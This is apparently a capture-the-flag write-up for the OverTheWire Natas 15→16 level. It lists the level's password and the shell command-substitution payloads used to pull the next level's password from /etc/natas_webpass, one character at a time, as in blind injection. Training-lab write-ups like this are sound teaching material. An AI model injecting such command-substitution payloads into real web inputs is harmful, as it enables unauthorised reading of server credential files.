# Level 15 → Level 16

## Details
Username: `natas16`<br />
Password: `TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V`<br />
URL:      http://natas16.natas.labs.overthewire.org

## Solution

# exstract spesific letter from password
`$(cut -c 1-1 /etc/natas_webpass/natas17)`


# convert numbers to chars
`$(printf \\$(printf %03o $((97+$(cut -c 8-8 /etc/natas_webpass/natas17)))))`

https://stackoverflow.com/questions/12855610/shell-script-is-there-any-way-converting-number-to-char


and then extract just one letter!
and do it like "blind sql injection"

## Password for the next level:
```

```
`"xkeuche_sbnkbvh_ru_ksib_uulmi_sd"`
`"xkeuche_sbnkbvh_ru_ksib_uulmi7sd"`
`"xkeuche_sbnkbvh_ru_ksib9uulmi7sd"`
`"xkeuche_sbnkbvh_ru7ksib9uulmi7sd"`
`"xkeuche_sbnkbvh1ru7ksib9uulmi7sd"`
`"xkeuche0sbnkbvh1ru7ksib9uulmi7sd"`